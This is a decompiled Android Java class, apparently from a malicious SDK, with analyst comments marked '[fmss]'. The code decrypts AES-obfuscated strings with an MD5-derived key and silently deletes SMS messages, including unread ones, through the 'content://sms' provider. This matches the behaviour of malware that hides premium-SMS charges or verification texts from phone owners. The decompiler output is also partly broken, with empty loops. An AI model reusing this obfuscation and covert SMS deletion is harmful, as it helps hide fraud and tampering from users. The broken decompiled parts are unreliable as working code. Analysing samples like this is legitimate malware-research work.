package a.a;

import a.e.d;
import android.content.Context;
import android.net.Uri;
import bn.sdk.szwcsss.common.az.c.model.Cdo;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
/* loaded from: classes.dex */
public class b {

    /* renamed from: a  reason: collision with root package name */
    public String f486a = "";
    public String b = "";

    public static int a(String str, Context context) {
        return c(a(d.a().F[37], d.a().G) + str + "'and read = 0", context);
    }

    /* JADX WARN: Removed duplicated region for block: B:8:0x0020  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String a(String str) {
        UnsupportedEncodingException e;
        MessageDigest messageDigest;
        NoSuchAlgorithmException e2;
        byte[] digest;
        try {
            messageDigest = MessageDigest.getInstance("MD5");
        } catch (UnsupportedEncodingException e3) {
            e = e3;
            messageDigest = null;
        } catch (NoSuchAlgorithmException e4) {
            e2 = e4;
            messageDigest = null;
        }
        try {
            messageDigest.reset();
            messageDigest.update(str.getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e5) {
            e = e5;
            e.printStackTrace();
            digest = messageDigest.digest();
            StringBuffer stringBuffer = new StringBuffer();
            while (r0 < digest.length) {
            }
            return stringBuffer.toString();
        } catch (NoSuchAlgorithmException e6) {
            e2 = e6;
            e2.printStackTrace();
            digest = messageDigest.digest();
            StringBuffer stringBuffer2 = new StringBuffer();
            while (r0 < digest.length) {
            }
            return stringBuffer2.toString();
        }
        digest = messageDigest.digest();
        StringBuffer stringBuffer22 = new StringBuffer();
        for (byte b : digest) {
            String hexString = Integer.toHexString(b & 255);
            if (hexString.length() == 1) {
                hexString = "0" + hexString;
            }
            stringBuffer22.append(hexString.toUpperCase());
        }
        return stringBuffer22.toString();
    }

    //[fmss] This method encrypt the informations with AES/CBC/PKCS5Padding.
    public static String a(String str, String str2) {
        byte[] bArr;
        try {
            String a2 = a(str2);
            if (str.length() <= 0) {
                bArr = null;
            } else {
                bArr = new byte[str.length() / 2];
                for (int i = 0; i < str.length() / 2; i++) {
                    bArr[i] = (byte) ((Integer.parseInt(str.substring(i << 1, (i << 1) + 1), 16) << 4) + Integer.parseInt(str.substring((i << 1) + 1, (i << 1) + 2), 16));
                }
            }
            byte[] bytes = a2.getBytes("UTF-8");
            byte[] bArr2 = new byte[16];
            System.arraycopy(bytes, 0, bArr2, 0, 16);
            IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr2);
            SecretKeySpec secretKeySpec = new SecretKeySpec(bytes, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, secretKeySpec, ivParameterSpec);
            return new String(cipher.doFinal(bArr));
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static Map a() {
        HashMap hashMap = new HashMap();
        hashMap.put(a(d.a().F[13], d.a().G), d.a().f);
        hashMap.put(a(d.a().F[18], d.a().G), d.a().g);
        hashMap.put(a(d.a().F[19], d.a().G), d.a().h);
        hashMap.put(a(d.a().F[20], d.a().G), d.a().i);
        hashMap.put(a(d.a().F[21], d.a().G), d.a().j);
        hashMap.put(a(d.a().F[22], d.a().G), d.a().k);
        hashMap.put(a(d.a().F[23], d.a().G), d.a().m);
        hashMap.put(a(d.a().F[24], d.a().G), d.a().n);
        hashMap.put(a(d.a().F[25], d.a().G), d.a().o);
        hashMap.put(a(d.a().F[26], d.a().G), d.a().p);
        hashMap.put(a(d.a().F[27], d.a().G), d.a().q);
        hashMap.put(a(d.a().F[28], d.a().G), d.a().s);
        hashMap.put(a(d.a().F[30], d.a().G), d.a().w);
        hashMap.put(a(d.a().F[31], d.a().G), d.a().x);
        hashMap.put(a(d.a().F[32], d.a().G), d.a().z);
        return hashMap;
    }

    public static int b(String str, Context context) {
        return c(a(d.a().F[38], d.a().G) + str + a(d.a().F[39], d.a().G), context);
    }

    // [fmss] This method deletes all data in "content://sms" (uses the string e defined in the class Cdo)
    private static int c(String str, Context context) {
        return context.getContentResolver().delete(Uri.parse(Cdo.e), str, null);
    }
}
